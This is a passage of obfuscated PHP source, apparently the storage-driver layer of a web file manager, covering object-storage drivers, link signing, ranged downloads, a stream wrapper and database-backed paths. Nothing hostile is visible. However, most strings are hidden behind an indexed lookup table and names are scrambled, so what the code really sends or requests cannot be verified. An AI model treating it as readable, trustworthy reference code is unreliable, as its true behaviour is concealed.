$ŸŠˆ½³Ø = IO::getPathInner(IO::mkfile($‰ºÔì)); if (!($ö—è¾ = $this->link($Í¹¬àÓï))) { return !1; } $‚š Â“½ = 0; $‡°ì–İ® = 1024 * 200; $ÇøÆÑïì = fopen($ŸŠˆ½³Ø, $_SERVER[Õò”†—·][1514]); while (!0) { $üì–ô’ = $this->fileSubstr($Í¹¬àÓï, $‚š Â“½, $‡°ì–İ®); if ($üì–ô’ === !1) { return !1; } fwrite($ÇøÆÑïì, $üì–ô’); $‚š Â“½ += $‡°ì–İ®; if (strlen($üì–ô’) < $‡°ì–İ®) { break; } } fclose($ÇøÆÑïì); return $‰ºÔì; } public function link($ŞüÙª, $Ú„¹´­õ = array()) { $¤ë›ÁŞõ =& $_SERVER[Õò”†—·]; $ŞüÙª = trim($ŞüÙª, $¤ë›ÁŞõ[18]); if (!empty($this->token)) { $¼÷›é¢Ñ = strtotime(date($¤ë›ÁŞõ[1578])); $ËÚ„·ÌË = substr(md5($this->token . $¤ë›ÁŞõ[344] . $¼÷›é¢Ñ . $¤ë›ÁŞõ[1579] . $ŞüÙª), 12, 8) . $¼÷›é¢Ñ; $Ú„¹´­õ[] = $¤ë›ÁŞõ[1580] . $ËÚ„·ÌË; } $îùç°» = !empty($Ú„¹´­õ) ? $¤ë›ÁŞõ[86] . implode($¤ë›ÁŞõ[344], $Ú„¹´­õ) : $¤ë›ÁŞõ[22]; return $this->getHost() . $¤ë›ÁŞõ[18] . $ŞüÙª . $îùç°»; } public function fileOut($Åïœç‡§, $„ÙÚÛéˆ = false, $î÷¶Ÿğ™ = false, $Õö½êï¤ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Åïœç‡§, $„ÙÚÛéˆ, $î÷¶Ÿğ™, $Õö½êï¤); } if (!$î÷¶Ÿğ™) { $î÷¶Ÿğ™ = $this->pathThis($Åïœç‡§); } $ÙÃéóæ† = $„ÙÚÛéˆ ? array($_SERVER[Õò”†—·][1581] . rawurlencode($î÷¶Ÿğ™)) : array(); $Ê‚üƒÑ = $this->link($Åïœç‡§, $ÙÃéóæ†); $this->fileOutLink($Ê‚üƒÑ); } public function fileOutServer($–†“·¶é, $à­×òÔ = false, $ŞßÁ·ğ¹ = false, $ÎÚÕå÷æ = '') { parent::fileOut($–†“·¶é, $à­×òÔ, $ŞßÁ·ğ¹, $ÎÚÕå÷æ); } public function fileOutImage($Å­Ë§¡Ó, $–ŠÙ¯²¡ = 250) { $›Ñ˜Âµ = $this->link($Å­Ë§¡Ó . $_SERVER[Õò”†—·][1582] . $–ŠÙ¯²¡); $this->fileOutLink($›Ñ˜Âµ); } public function fileOutImageServer($½”…ú¹ô, $ğı¡‘¾“ = 250) { parent::fileOutImage($½”…ú¹ô, $ğı¡‘¾“); } public function hashMd5($‚…£„õò) { $Õı¨ù¥ =& $_SERVER[Õò”†—·]; $‰¶†‘„ß = $this->_objectMeta($‚…£„õò); return isset($‰¶†‘„ß[$Õı¨ù¥[246]]) ? $‰¶†‘„ß[$Õı¨ù¥[246]] : !1; } public function size($Û‚º•®Í) { $×œ£—ãÛ = $this->objectMeta($Û‚º•®Í); return $×œ£—ãÛ ? $×œ£—ãÛ[$_SERVER[Õò”†—·][89]] : 0; } public function info($™š“ëŞè) { if ($this->isFolder($™š“ëŞè)) { return $this->folderInfo($™š“ëŞè); } else { if ($this->isFile($™š“ëŞè)) { return $this->fileInfo($™š“ëŞè); } } return !1; } public function exist($ßû°•ïü) { return $this->isFile($ßû°•ïü) || $this->isFolder($ßû°•ïü); } public function isFile($ü¾×¯š») { return !$this->isFolder($ü¾×¯š») && $this->objectMeta($ü¾×¯š»); } public function isFolder($’×Œ«äƒ) { return $this->cacheMethod($_SERVER[Õò”†—·][179], $’×Œ«äƒ); } protected function objectMeta($ûø®ÃÉ) { return $this->cacheMethod($_SERVER[Õò”†—·][181], $ûø®ÃÉ); } protected function _objectMeta($¥Ñ…Ú­ú) { $ÑşÓğ´ô =& $_SERVER[Õò”†—·]; if ($¥Ñ…Ú­ú == $ÑşÓğ´ô[22] || $¥Ñ…Ú­ú == $ÑşÓğ´ô[18]) { return array(); } $×ññ”èË = $this->ussRequest($¥Ñ…Ú­ú, $ÑşÓğ´ô[1583]); if (!$×ññ”èË[$ÑşÓğ´ô[1266]]) { return null; } $âŸÙÏâì = isset($×ññ”èË[$ÑşÓğ´ô[1256]]) ? $×ññ”èË[$ÑşÓğ´ô[1256]] : array(); if (!isset($âŸÙÏâì[$ÑşÓğ´ô[1584]])) { return null; } $ëØíÙÛí = array($ÑşÓğ´ô[43] => isset($âŸÙÏâì[$ÑşÓğ´ô[1584]]) ? $âŸÙÏâì[$ÑşÓğ´ô[1584]] : null, $ÑşÓğ´ô[89] => isset($âŸÙÏâì[$ÑşÓğ´ô[1585]]) ? $âŸÙÏâì[$ÑşÓğ´ô[1585]] : null, $ÑşÓğ´ô[246] => isset($âŸÙÏâì[$ÑşÓğ´ô[1586]]) ? $âŸÙÏâì[$ÑşÓğ´ô[1586]] : null, $ÑşÓğ´ô[1553] => isset($âŸÙÏâì[$ÑşÓğ´ô[1587]]) ? $âŸÙÏâì[$ÑşÓğ´ô[1587]] : null); $ëØíÙÛí[$ÑşÓğ´ô[1554]] = isset($âŸÙÏâì[$ÑşÓğ´ô[1588]]) ? strtotime($âŸÙÏâì[$ÑşÓğ´ô[1588]]) : $ëØíÙÛí[$ÑşÓğ´ô[1553]]; return $ëØíÙÛí; } protected function _isFolder($ğÌù»ì‰) { $À“ø‚Åæ =& $_SERVER[Õò”†—·]; if ($ğÌù»ì‰ == $À“ø‚Åæ[22] || $ğÌù»ì‰ == $À“ø‚Åæ[18]) { return !0; } $¤Ø÷ÊÃ– = $this->_objectMeta($ğÌù»ì‰); return isset($¤Ø÷ÊÃ–[$À“ø‚Åæ[43]]) && $¤Ø÷ÊÃ–[$À“ø‚Åæ[43]] == $À“ø‚Åæ[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ğ„ŠŒÌ¶ = false) { } public function exist($›Å·’µº) { $ıáØ©è… = $this->info($›Å·’µº); return $ıáØ©è…[$_SERVER[Õò”†—·][233]]; } public function isFile($¢ùÊÛŠù) { $ÚÊËÕœ  = $this->info($¢ùÊÛŠù); return $ÚÊËÕœ [$_SERVER[Õò”†—·][233]]; } public function isFolder($œÉ´ºãß) { return !1; } public function size($öÈ…ç§ì) { $§Æ¬Â = $this->info($öÈ…ç§ì); return $§Æ¬Â[$_SERVER[Õò”†—·][89]]; } public function info($óòùíšÇ) { return $this->infoParse($óòùíšÇ); } public function infoAuth($ÈÜ‚Ï×) { return $this->infoParse($ÈÜ‚Ï×); } public function infoWithChildren($ñã™àíè) { return $this->infoParse($ñã™àíè); } public function infoFull($èáâ  ë) { return $this->infoParse($èáâ  ë); } private function infoParse($ëˆãë) { $Ù¯ˆ„Æ¤ =& $_SERVER[Õò”†—·]; $ÅÜ ³Ğ = $this->header($ëˆãë); if (!$ÅÜ ³Ğ || !$ÅÜ ³Ğ[$Ù¯ˆ„Æ¤[801]]) { return !1; } $˜ûìÁÁ² = _get($ÅÜ ³Ğ, $Ù¯ˆ„Æ¤[397], 0); $ñØ÷¥¦ = array($Ù¯ˆ„Æ¤[42] => $ÅÜ ³Ğ[$Ù¯ˆ„Æ¤[42]], $Ù¯ˆ„Æ¤[97] => $ëˆãë, $Ù¯ˆ„Æ¤[43] => $Ù¯ˆ„Æ¤[231], $Ù¯ˆ„Æ¤[89] => intval($˜ûìÁÁ²), $Ù¯ˆ„Æ¤[188] => get_path_ext($ÅÜ ³Ğ[$Ù¯ˆ„Æ¤[42]]), $Ù¯ˆ„Æ¤[1424] => $˜ûìÁÁ² > 0 && $ÅÜ ³Ğ[$Ù¯ˆ„Æ¤[1589]], $Ù¯ˆ„Æ¤[1425] => !1); return $ñØ÷¥¦; } private function header($ÑŠ§Ã) { $®Åñ¶­ô =& $_SERVER[Õò”†—·]; if (isset(self::$_cacheHeader[$ÑŠ§Ã])) { return self::$_cacheHeader[$ÑŠ§Ã]; } $èÕÛãÍÛ = isset($GLOBALS[$®Åñ¶­ô[1590]]) ? $GLOBALS[$®Åñ¶­ô[1590]] : !1; $GLOBALS[$®Åñ¶­ô[1590]] = !0; self::$_cacheHeader[$ÑŠ§Ã] = url_header($ÑŠ§Ã); $GLOBALS[$®Åñ¶­ô[1590]] = $èÕÛãÍÛ; return self::$_cacheHeader[$ÑŠ§Ã]; } public function hashSimple($ºªöÜ, $ï—ôŒÕâ = false) { $¡Ìºğµû =& $_SERVER[Õò”†—·]; $Ûõ¥ú½ = $this->info($ºªöÜ); if (!$Ûõ¥ú½ || !$Ûõ¥ú½[$¡Ìºğµû[233]]) { return !1; } $Á—¸Á¨† = $Ûõ¥ú½[$¡Ìºğµû[89]]; $µœ†š°š = 200; $Ä¤ƒĞŠ = 50; if ($Á—¸Á¨† <= $µœ†š°š * $Ä¤ƒĞŠ) { return md5($this->fileSubstr($ºªöÜ, 0, $Á—¸Á¨†)) . $Á—¸Á¨†; } $„§üÅå• = intval($Á—¸Á¨† / $Ä¤ƒĞŠ); $Ä¶–ĞÙ = $¡Ìºğµû[22]; $õêÒ…¼ = timeFloat(); $ï¢Ûñ£ = 15; for ($ì¶¤‚ğ£ = 0; $ì¶¤‚ğ£ < $Ä¤ƒĞŠ; $ì¶¤‚ğ£++) { if (timeFloat() - $õêÒ…¼ > $ï¢Ûñ£) { return !1; } $¹¢ÑÓÆœ = $this->fileSubstr($ºªöÜ, $„§üÅå• * $ì¶¤‚ğ£, $µœ†š°š); if (!$¹¢ÑÓÆœ) { return !1; } $Ä¶–ĞÙ .= $¹¢ÑÓÆœ; } $Ä¶–ĞÙ .= $this->fileSubstr($ºªöÜ, $Á—¸Á¨† - $µœ†š°š, $µœ†š°š); return md5($Ä¶–ĞÙ) . $Á—¸Á¨†; } public function getContent($¤ƒËœçÄ) { return $this->fileSubstr($¤ƒËœçÄ); } public function fileSubstr($ç§¤ãè¼, $èÑÅ¡™í = 0, $ĞĞ»±• = -1) { $—å—Í«½ =& $_SERVER[Õò”†—·]; $ÑœãÏÎÃ = $this->info($ç§¤ãè¼); if (!$ÑœãÏÎÃ || !$ÑœãÏÎÃ[$—å—Í«½[233]] && $ÑœãÏÎÃ[$—å—Í«½[89]] > 1024 * 1024 * 10) { return !1; } if ($ĞĞ»±• === -1) { $ĞĞ»±• = $ÑœãÏÎÃ[$—å—Í«½[89]]; } if ($ĞĞ»±• == 0) { return $—å—Í«½[22]; } $ÆßºÎ = array($—å—Í«½[1591] . $èÑÅ¡™í . $—å—Í«½[835] . ($èÑÅ¡™í + $ĞĞ»±• - 1)); $íá¿ø¨“ = url_request($ç§¤ãè¼, $—å—Í«½[262], !1, $ÆßºÎ, !1, !1, 30); return $íá¿ø¨“[$—å—Í«½[1256]] ? $íá¿ø¨“[$—å—Í«½[1256]] : $—å—Í«½[22]; } public function download($”ö†’ôÉ, $‰ëİŞğÜ) { Downloader::start($”ö†’ôÉ, $‰ëİŞğÜ); return $‰ëİŞğÜ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($»ËÃá»ó, $§–‰¥˜° = '') { $this->info = $this->info($»ËÃá»ó); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Õò”†—·][97]]; $this->pathOpen = $»ËÃá»ó; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$»ËÃá»ó])) { self::$_chunkBuffer[$»ËÃá»ó] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¿é’í³) { $¸¦«û¬‚ = $this->fileSubstr($this->pose, $¿é’í³); $this->pose += strlen($¸¦«û¬‚); return $¸¦«û¬‚; } public function stream_tell() { return $this->pose; } public function stream_seek($«¢Ïº, $¹óÃ˜¬•) { $ßØ°àß¤ =& $_SERVER[Õò”†—·]; if ($¹óÃ˜¬• == SEEK_SET) { $this->pose = $«¢Ïº; } else { if ($¹óÃ˜¬• == SEEK_CUR) { $this->pose += $«¢Ïº; } else { if ($¹óÃ˜¬• == SEEK_END) { $this->pose = $this->info[$ßØ°àß¤[89]] + intval($«¢Ïº); } } } if ($«¢Ïº < 0) { $this->pose = $this->info[$ßØ°àß¤[89]] + $«¢Ïº; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Õò”†—·][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¨ğÃË¨í, $ëâÂíÀ©) { $ò‘¨³ş¦ =& $_SERVER[Õò”†—·]; $ˆàÍ”íÑ = $this->info($¨ğÃË¨í); return array($ò‘¨³ş¦[1592] => 0, $ò‘¨³ş¦[1593] => 0, $ò‘¨³ş¦[26] => 32768 + 511, $ò‘¨³ş¦[1594] => 0, $ò‘¨³ş¦[1595] => 0, $ò‘¨³ş¦[1596] => 0, $ò‘¨³ş¦[1597] => 0, $ò‘¨³ş¦[89] => $ˆàÍ”íÑ[$ò‘¨³ş¦[89]], $ò‘¨³ş¦[1598] => $ˆàÍ”íÑ[$ò‘¨³ş¦[1423]], $ò‘¨³ş¦[1554] => $ˆàÍ”íÑ[$ò‘¨³ş¦[98]], $ò‘¨³ş¦[1553] => $ˆàÍ”íÑ[$ò‘¨³ş¦[232]], $ò‘¨³ş¦[1599] => 0, $ò‘¨³ş¦[1600] => 0); } static $fileInfo = array(); public function info($Âó¦œ”) { $ßä¥¢ì€ = $_SERVER[Õò”†—·][1601]; if (isset(self::$fileInfo[$Âó¦œ”])) { return self::$fileInfo[$Âó¦œ”]; } if (substr($Âó¦œ”, 0, strlen($ßä¥¢ì€)) != $ßä¥¢ì€) { return !1; } self::$fileInfo[$Âó¦œ”] = IO::info(substr($Âó¦œ”, strlen($ßä¥¢ì€))); return self::$fileInfo[$Âó¦œ”]; } public static function read($‡Î¹ÃŒ©, $ÇĞĞ, $­ìëù¦…) { if (!isset(self::$_fopenCache[$‡Î¹ÃŒ©])) { $ŸÄó€§ş = new StreamWrapperIO(); $ŸÄó€§ş->stream_open($‡Î¹ÃŒ©); self::$_fopenCache[$‡Î¹ÃŒ©] = $ŸÄó€§ş; } $ŸÄó€§ş = self::$_fopenCache[$‡Î¹ÃŒ©]; return $ŸÄó€§ş->fileSubstr($ÇĞĞ, $­ìëù¦…); } public static function _read($Ü•œ½º¹, $òÚ«ÄíŞ, $€„­ƒ–Ğ) { $–äøÆşÎ =& $_SERVER[Õò”†—·]; $¸©æğİ = fopen($Ü•œ½º¹, $–äøÆşÎ[1427]); if (!$¸©æğİ) { return $–äøÆşÎ[22]; } $ ±ƒËÑô = 8192; fseek($¸©æğİ, $òÚ«ÄíŞ, SEEK_SET); $ì²ÏÃŞ = $–äøÆşÎ[22]; $üå¶í±æ = 0; while ($üå¶í±æ < $€„­ƒ–Ğ) { $ºÛ°¸¿ = min($ ±ƒËÑô, $€„­ƒ–Ğ - $üå¶í±æ); $ì²ÏÃŞ .= fread($¸©æğİ, $ºÛ°¸¿); $üå¶í±æ += $ºÛ°¸¿; } fclose($¸©æğİ); return $ì²ÏÃŞ; } public function fileSubstr($ğœ¥™Şó, $à€ó©÷š) { $Å‰‘« =& $_SERVER[Õò”†—·]; $â˜Àşú = $this->info[$Å‰‘«[89]]; $¤¢³µ = $ğœ¥™Şó; $í‚¸åÎ® = $à€ó©÷š; if ($ğœ¥™Şó < 0) { $ğœ¥™Şó = $â˜Àşú + $ğœ¥™Şó; } if ($à€ó©÷š === !1) { $à€ó©÷š = $â˜Àşú - $ğœ¥™Şó; } if ($ğœ¥™Şó + $à€ó©÷š > $â˜Àşú) { $à€ó©÷š = $â˜Àşú - $ğœ¥™Şó; } if ($à€ó©÷š <= 0) { return $Å‰‘«[22]; } if ($ğœ¥™Şó < 0 || $ğœ¥™Şó >= $â˜Àşú || $à€ó©÷š <= 0 || $à€ó©÷š > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\151\154\x65\x52\145\141\x64\x20\x65\162\162\157\x72\x21\40\163\x74\141\x72\164\75{$ğœ¥™Şó}\73\x6c\x65\156\147\x74\x68\x3d{$à€ó©÷š}\73\40\163\x69\172\145\75{$â˜Àşú}\73"); } $—µßÊ‚Õ = 64 * 1024; $ÍœÄ»½å =& self::$_chunkBuffer[$this->path]; if (!$ÍœÄ»½å) { $ÍœÄ»½å = array(); } $ß³—Å»â = 0; $Áã¦‚Ö  = 0; $œø¾ª¤Ö = $Å‰‘«[22]; foreach ($ÍœÄ»½å as $ß³—Å»â => $œø¾ª¤Ö) { $ß³—Å»â = intval($ß³—Å»â); $Áã¦‚Ö  = $ß³—Å»â + strlen($œø¾ª¤Ö); if ($ğœ¥™Şó >= $Áã¦‚Ö ) { continue; } if ($ğœ¥™Şó >= $ß³—Å»â && $ğœ¥™Şó + $à€ó©÷š <= $Áã¦‚Ö ) { return substr($œø¾ª¤Ö, $ğœ¥™Şó - $ß³—Å»â, $à€ó©÷š); } break; } if (count($ÍœÄ»½å) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Å‰‘«[1602], $Å‰‘«[1603] . count($ÍœÄ»½å) . "\73\x73\x74\x61\162\x74\x3d{$ğœ¥™Şó}\54\x6c\x65\x6e\x67\x74\150\x3d{$à€ó©÷š}\x3b\x70\x6f\163\x65\x3a{$ß³—Å»â}\176{$Áã¦‚Ö }"); throw new Exception($Å‰‘«[1604]); } $è£Şˆâû = intval($ğœ¥™Şó / $—µßÊ‚Õ) * $—µßÊ‚Õ; $íûÙÑº = ceil(($ğœ¥™Şó + $à€ó©÷š) / $—µßÊ‚Õ) * $—µßÊ‚Õ - $è£Şˆâû; $˜å¾×±º = IO::fileSubstr($this->path, $è£Şˆâû, $íûÙÑº); $ÍœÄ»½å[$è£Şˆâû . $Å‰‘«[22]] = $˜å¾×±º; ksort($ÍœÄ»½å); $º¼­óô€ = substr($˜å¾×±º, $ğœ¥™Şó - $è£Şˆâû, $à€ó©÷š); return $º¼­óô€; } private function log($óş„Ø¦ö, $÷¦¯ƒ‹³) { $Å¹Šñº÷ =& $_SERVER[Õò”†—·]; $ÛÒ‡«Ñö = timeFloat() - $this->timeStart; write_log(sprintf($Å¹Šñº÷[1605], $óş„Ø¦ö, $this->info[$Å¹Šñº÷[42]], $ÛÒ‡«Ñö, $÷¦¯ƒ‹³), $Å¹Šñº÷[1236]); } } goto F¡ÍÓÑ•÷; Fï–ğèğ±…: class PathDriverBOS extends PathDriverS3 { public function __construct($Á¿„½í²) { parent::__construct($Á¿„½í²); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ı´ƒ®Çô) { $Şô³è¹Ì =& $_SERVER[Õò”†—·]; if (substr($ı´ƒ®Çô, 0, 7) == $Şô³è¹Ì[1378]) { $ı´ƒ®Çô = $Şô³è¹Ì[1379] . substr($ı´ƒ®Çô, 7); } header($Şô³è¹Ì[175] . $ı´ƒ®Çô); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ü½Ä‚£›) { parent::__construct($ü½Ä‚£›); $this->setSignVersion($_SERVER[Õò”†—·][248]); } public function uploadFormData($Şï™´, $Ä–èŒŒ‡ = 3600) { $§™ÒĞÍô =& $_SERVER[Õò”†—·]; $¾ù“²æŸ = $§™ÒĞÍô[230]; $ ­Ô¤Ö— = $§™ÒĞÍô[263]; $¸˜è¦â = $§™ÒĞÍô[274]; $Õù“…îŸ = gmdate($§™ÒĞÍô[1380], time() + $Ä–èŒŒ‡); $İÉ¡ŒÛñ = (string) time() . $§™ÒĞÍô[84] . (string) (time() + $Ä–èŒŒ‡); $ìï¥êÏÌ = array($§™ÒĞÍô[275] => $Õù“…îŸ, $§™ÒĞÍô[278] => array(array($§™ÒĞÍô[280] => $¾ù“²æŸ), array($§™ÒĞÍô[279] => $this->bucket), array($§™ÒĞÍô[281], $§™ÒĞÍô[282], $§™ÒĞÍô[22]), array($§™ÒĞÍô[285] => $¸˜è¦â), array($§™ÒĞÍô[1381] => $ ­Ô¤Ö—), array($§™ÒĞÍô[1382] => $this->accessKey), array($§™ÒĞÍô[1383] => $İÉ¡ŒÛñ))); $ìï¥êÏÌ = json_encode($ìï¥êÏÌ); $§ÁØ·Ú¯ = hash_hmac($§™ÒĞÍô[263], $İÉ¡ŒÛñ, $this->secret); $£†ñõ = sha1($ìï¥êÏÌ); $÷úÇ¥ÎÖ = hash_hmac($§™ÒĞÍô[263], $£†ñõ, $§ÁØ·Ú¯); $µ†ºÊ÷ = array($§™ÒĞÍô[280] => $¾ù“²æŸ, $§™ÒĞÍô[285] => $¸˜è¦â, $§™ÒĞÍô[293] => base64_encode($ìï¥êÏÌ), $§™ÒĞÍô[1381] => $ ­Ô¤Ö—, $§™ÒĞÍô[1382] => $this->accessKey, $§™ÒĞÍô[1384] => $İÉ¡ŒÛñ, $§™ÒĞÍô[1385] => $÷úÇ¥ÎÖ, $§™ÒĞÍô[209] => $this->getHost()); return $µ†ºÊ÷; } public function fileOutImage($§Âƒ¶¦¦, $×€Ò¬  = 250) { $œÑ¶øÖİ =& $_SERVER[Õò”†—·]; if ($this->size($§Âƒ¶¦¦) > 1024 * 1024 * 32) { return $this->fileOutImageServer($§Âƒ¶¦¦, $×€Ò¬ ); } $‚èøâœÉ = $this->link($§Âƒ¶¦¦); $‚èøâœÉ .= $œÑ¶øÖİ[1386] . $×€Ò¬  . $œÑ¶øÖİ[1387]; $this->fileOutLink($‚èøâœÉ); } public function fileOutLink($Á¨ÔªÍÃ) { $»‚¿ò =& $_SERVER[Õò”†—·]; if (substr($Á¨ÔªÍÃ, 0, 7) == $»‚¿ò[1378]) { $Á¨ÔªÍÃ = $»‚¿ò[1379] . substr($Á¨ÔªÍÃ, 7); } header($»‚¿ò[175] . $Á¨ÔªÍÃ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($“Ë“ö») { $this->pathParse = $“Ë“ö»; $this->model = Model($_SERVER[Õò”†—·][1388]); } public function getPath($Û¹µúš·) { return trim($Û¹µúš·, $_SERVER[Õò”†—·][18]); } public function pathFather($È¹á½¤) { $éôÖÕ ® = $this->parse($È¹á½¤); $éôÖÕ ® = $this->infoSimple($È¹á½¤); return $éôÖÕ ® ? $éôÖÕ ®[$_SERVER[Õò”†—·][193]] : !1; } public function pathThis($ò«äü›À) { $µŒ°© Â = $this->infoSimple($ò«äü›À); return $µŒ°© Â ? $µŒ°© Â[$_SERVER[Õò”†—·][42]] : !1; } public function getPathOuter($‰¥Úé“Â) { if (!$‰¥Úé“Â) { return $‰¥Úé“Â; } $Ö®İÒ«İ = $this->parse($‰¥Úé“Â); return KodIO::make($Ö®İÒ«İ[$_SERVER[Õò”†—·][459]]); } public function copyFolderFromIO($ıŒƒÈÁ¥, $È‘Ğ³Ş, $‚ÁüØ÷ô, $ˆ³‘Íé¼, $¾ÓûæÊ) { $Ş¸¤ŸÙÂ = $this->model->copyFolderFromIO($ıŒƒÈÁ¥, $È‘Ğ³Ş, $‚ÁüØ÷ô, $ˆ³‘Íé¼, $¾ÓûæÊ); return KodIO::make($Ş¸¤ŸÙÂ); } public function isParentOf($‘‘™éì, $çüÉò§Î) { return $this->model->isParentOf($‘‘™éì, $çüÉò§Î); } public function mkfile($êÃ‡Ş, $»š×ÄÆÌ = '', $æäÀó° = REPEAT_RENAME) { $áÏ’‡²û =& $_SERVER[Õò”†—·]; $ÈöÈ¬€® = $this->parse($êÃ‡Ş); $êÃ‡Ş = $ÈöÈ¬€®[$áÏ’‡²û[459]]; for ($ùØó€Á¡ = 0; $ùØó€Á¡ < count($ÈöÈ¬€®[$áÏ’‡²û[1389]]); $ùØó€Á¡++) { $Ùôü°½µ = $ÈöÈ¬€®[$áÏ’‡²û[1389]][$ùØó€Á¡]; if ($ùØó€Á¡ == count($ÈöÈ¬€®[$áÏ’‡²û[1389]]) - 1) { $êÃ‡Ş = $this->model->mkfile($êÃ‡Ş, $Ùôü°½µ, $»š×ÄÆÌ, $æäÀó°); break; } $êÃ‡Ş = $this->model->mkdir($êÃ‡Ş, $Ùôü°½µ, REPEAT_SKIP); } return $this->getPathOuter($êÃ‡Ş); } public function mkdir($˜ìèå‰, $ÇŸ…š«• = REPEAT_SKIP) { $í¶ƒ‡ä° =& $_SERVER[Õò”†—·]; $Ñ€ÄÖ¹¨ = $this->parse($˜ìèå‰); $˜ìèå‰ = $Ñ€ÄÖ¹¨[$í¶ƒ‡ä°[459]]; for ($›³ƒ‹ÂÑ = 0; $›³ƒ‹ÂÑ < count($Ñ€ÄÖ¹¨[$í¶ƒ‡ä°[1389]]); $›³ƒ‹ÂÑ++) { $¡š†º¼Ù = $Ñ€ÄÖ¹¨[$í¶ƒ‡ä°[1389]][$›³ƒ‹ÂÑ]; $˜ìèå‰ = $this->model->mkdir($˜ìèå‰, $¡š†º¼Ù, $ÇŸ…š«•); } return $this->getPathOuter($˜ìèå‰); } public function copyFile($ï²¿øÎÅ, $öìœùŸš, $Úå«ÅüÒ = REPEAT_REPLACE) { $ÎÈ¼ÁõÜ =& $_SERVER[Õò”†—·]; $àñøñÁ = $this->parse($öìœùŸš); $…¡·Ò = $this->model->copy($ï²¿øÎÅ, $àñøñÁ[$ÎÈ¼ÁõÜ[459]], $Úå«ÅüÒ, $àñøñÁ[$ÎÈ¼ÁõÜ[97]]); return $…¡·Ò ? $this->getPathOuter($…¡·Ò) : !1; } public function moveFile($’¤ˆ®à, $åÅÓºĞÑ, $èÏµÓÕ = REPEAT_REPLACE) { $”ò‹®ó =& $_SERVER[Õò”†—·]; $”“÷¯ä = $this->parse($åÅÓºĞÑ); $ªº•Åòô = $this->model->move($’¤ˆ®à, $”“÷¯ä[$”ò‹®ó[459]], $èÏµÓÕ, $”“÷¯ä[$”ò‹®ó[97]]); return $ªº•Åòô ? $this->getPathOuter($ªº•Åòô) : !1; } public function copy($ˆÇ‹¦ïÀ, $‰€¦·×°, $© à¯«¢ = REPEAT_REPLACE, $øˆšÜÉÂ = false) { $úâ‹ÀÓÑ = $this->parse($‰€¦·×°); $¶™ğ‰ä½ = $this->model->copy($ˆÇ‹¦ïÀ, $úâ‹ÀÓÑ[$_SERVER[Õò”†—·][459]], $© à¯«¢, $øˆšÜÉÂ); return $¶™ğ‰ä½ ? $this->getPathOuter($¶™ğ‰ä½) : !1; } public function moveSameAllow() { } public function move($º´Éäáù, $«ÏÉœ¤‰, $è„ÂÙ˜† = REPEAT_REPLACE, $‡§şïÙ = false) { $šÄ®’©„ = $this->parse($«ÏÉœ¤‰); $åæûüµ = $this->model->move($º´Éäáù, $šÄ®’©„[$_SERVER[Õò”†—·][459]], $è„ÂÙ˜†, $‡§şïÙ); return $åæûüµ ? $this->getPathOuter($åæûüµ) : !1; } public function remove($òäà‹•œ, $çñÈ³®ö = true) { return $this->model->remove($òäà‹•œ, $çñÈ³®ö); } public function rename($ˆˆ”¹Ï†, $“ Î Çı) { $Çíœ»ş´ = $this->model->rename($ˆˆ”¹Ï†, $“ Î Çı); return $Çíœ»ş´ ? $this->getPathOuter($ˆˆ”¹Ï†) : $Çíœ»ş´; } public function size($Ü‘Æé–‹) { $µ…¾œ£Ö = $this->infoSimple($Ü‘Æé–‹); return $µ…¾œ£Ö ? $µ…¾œ£Ö[$_SERVER[Õò”†—·][89]] : 0; } public function infoSimple($ñ‘¢Ş…Ù) { return $this->model->sourceInfo($ñ‘¢Ş…Ù); } public function info($ğØîøøÔ) { return $this->infoParse($ğØîøøÔ); } public function infoAuth($ÀşŞ·Õ¢) { return $this->infoParse($ÀşŞ·Õ¢, !1, !0); } public function infoWithChildren($±ÎËî×ä) { return $this->infoParse($±ÎËî×ä, !0); } protected function infoParse($İÓò¡±, $…ƒÍÙÔ˜ = false, $Ìöƒ™î¡ = false) { if (!$…ƒÍÙÔ˜) { return $this->model->pathInfo($İÓò¡±, $Ìöƒ™î¡); } return $this->model->pathInfoMore($İÓò¡±); } public function infoFullSimple($•¿½Š‰İ) { $Ó¼˜¡ =& $_SERVER[Õò”†—·]; $ä›¯×îÑ = explode($Ó¼˜¡[18], $•¿½Š‰İ); $şñ‡İ‹‡ = implode($Ó¼˜¡[18], array_splice($ä›¯×îÑ, 1)); return $this->model->pathInfoByPath($ä›¯×îÑ[0], $şñ‡İ‹‡); } public function infoFull($»Û‹ö) { $Å­·ÚøÁ = $this->infoFullSimple($»Û‹ö); return is_array($Å­·ÚøÁ) ? $this->model->pathInfo($Å­·ÚøÁ[$_SERVER[Õò”†—·][194]]) : !1; } public function hashSimple($†û¬Ùß¾) { $à‚Œ¶¢„ =& $_SERVER[Õò”†—·]; $ßšˆœì• = $this->infoWithChildren($†û¬Ùß¾); return $ßšˆœì•[$à‚Œ¶¢„[533]][$à‚Œ¶¢„[656]]; } public function hashMd5($œ¢‚Õ¦) { $îş­ªÉï =& $_SERVER[Õò”†—·]; $Ïœöæ—Í = $this->infoWithChildren($œ¢‚Õ¦); return $Ïœöæ—Í[$îş­ªÉï[533]][$îş­ªÉï[531]]; } public function exist($ããş³‚) { $íƒ¡—È¸ =& $_SERVER[Õò”†—·]; $×Œş¸Ôá = $this->parse($ããş³‚); if (!$×Œş¸Ôá[$íƒ¡—È¸[97]]) { return $this->isFile($ããş³‚) || $this->isFolder($ããş³‚); } $–²µ’åû = array($íƒ¡—È¸[461] => $×Œş¸Ôá[$íƒ¡—È¸[459]], $íƒ¡—È¸[42] => $×Œş¸Ôá[$íƒ¡—È¸[97]]); $“èâ€ = $this->model->where($–²µ’åû)->find(); return $“èâ€ ? 